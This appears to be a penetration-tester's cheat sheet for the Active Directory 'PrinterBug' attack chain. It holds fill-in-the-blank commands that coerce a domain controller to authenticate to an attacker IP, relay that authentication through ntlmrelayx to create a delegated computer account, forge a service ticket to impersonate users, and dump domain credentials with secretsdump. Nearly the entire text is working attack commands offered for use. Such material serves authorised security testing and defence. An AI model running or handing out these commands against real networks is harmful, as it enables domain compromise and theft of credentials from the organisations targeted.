# Printerbug

% printerbug, Active directory

## Finding Spooler services listening
#plateform/linux  #target/remote #cat/RECON 
```
rpcdump.py <domain>/<user>:'<password>'@<dc> | grep MS-RPRN
```

## Finding Spooler services anonymous
#plateform/linux  #target/remote #cat/RECON 
```
rpcdump.py <dc> | grep -A 6 MS-RPRN
```

## dementor
#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
https://github.com/NotMedic/NetNTLMtoSilverTicket

```
dementor.py -d <domain> -u <user> -p <password> <attacker_ip> <dc2>
```

## printerbug
#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py

```
printerbug.py '<domain>/<user>:<password>'@<ip> <attacker_ip>
```

## ntlmrelayx add computer
#plateform/linux  #target/remote #cat/ATTACK/MITM 
```
ntlmrelayx -t ldaps://<dc1> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
```

## use silver ticket
#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
```
getST.py -spn host/<dc2> -impersonate <user_to_impersonate> -dc-ip <dc1_ip> '<domain>/<computer_name>$:<computer_password>'
```

## secret dump with kerberos
#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump -k <dc>
```

= user : anonymous
= pass : anonymous
= computer_name : arsenal
= dc : DC01.domain.local
= dc1 : DC01.domain.local
= dc2 : DC02.domain.local
= computer_password : 123soleil

